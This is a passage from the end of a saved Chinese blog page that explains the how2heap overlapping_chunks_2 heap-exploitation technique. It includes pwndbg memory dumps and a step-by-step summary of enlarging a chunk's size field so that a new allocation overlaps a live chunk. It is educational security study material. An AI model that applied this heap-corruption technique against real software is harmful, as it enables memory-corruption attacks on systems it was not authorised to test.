<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x6033f0 PREV_INUSE {</span><br><span class="line">  prev_size = 4702111234474983745,</span><br><span class="line">  size = 2017,</span><br><span class="line">  fd = 0x7ffff7dd2158 &lt;main_arena+1592&gt;,</span><br><span class="line">  bk = 0x7ffff7dd2158 &lt;main_arena+1592&gt;,</span><br><span class="line">  fd_nextsize = 0x6033f0,</span><br><span class="line">  bk_nextsize = 0x6033f0</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>此时的p6 size大小为2017,我们看下</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p6</span><br><span class="line">$8 = (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; p p3</span><br><span class="line">$9 = (intptr_t *) 0x6037f0</span><br><span class="line">pwndbg&gt; p/x 2017</span><br><span class="line">$10 = 0x7e1</span><br><span class="line">pwndbg&gt; p p6+0x7e1</span><br><span class="line">$11 = (intptr_t *) 0x607308</span><br></pre></td></tr></tbody></table></figure>
<p>此时的p3已经成功被包在p6中了:)</p>
<h2 id="总结-1"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E6%80%BB%E7%BB%93-1" class="headerlink" title="总结"></a>总结</h2><p>好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5</p>
<p>紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中</p>
<p><strong>这里要注意,在本例中,是否free p4的效果是一样的</strong></p>
<p>之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E</p>
<p>紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2</p>
<p>这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并</p>
<p>然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333</p>
<p>此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)</p>
<p>这里也做一下overlapping_chunks和overlapping_chunks_2的比较</p>
<p>overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块 (overlapping chunk!</p>
<p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197583" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197583</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false" src="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
                    
                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>


    </div>
    
</div>


    </div>
</div></div>


<script src="./how2heap总结系列三 - 知世の小屋_files/gitalk.min.js"></script>
<script src="./how2heap总结系列三 - 知世の小屋_files/jquery.min.js"></script>
<script src="./how2heap总结系列三 - 知世の小屋_files/plugin.js"></script>
<script src="./how2heap总结系列三 - 知世の小屋_files/diaspora.js"></script><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><ins id="aswift_0_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0px;width:0px;height:0px;" src="./how2heap总结系列三 - 知世の小屋_files/saved_resource.html"></iframe></ins></ins></ins>
<link rel="stylesheet" href="./how2heap总结系列三 - 知世の小屋_files/photoswipe.css">
<link rel="stylesheet" href="./how2heap总结系列三 - 知世の小屋_files/default-skin.css">
<script src="./how2heap总结系列三 - 知世の小屋_files/photoswipe.min.js"></script>
<script src="./how2heap总结系列三 - 知世の小屋_files/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>





<iframe id="google_osd_static_frame_4498621090117" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" src="./how2heap总结系列三 - 知世の小屋_files/saved_resource(1).html"></iframe></body><iframe id="google_esf" name="google_esf" src="./how2heap总结系列三 - 知世の小屋_files/zrt_lookup.html" data-ad-client="ca-pub-8691406134231910" style="display: none;"></iframe></html>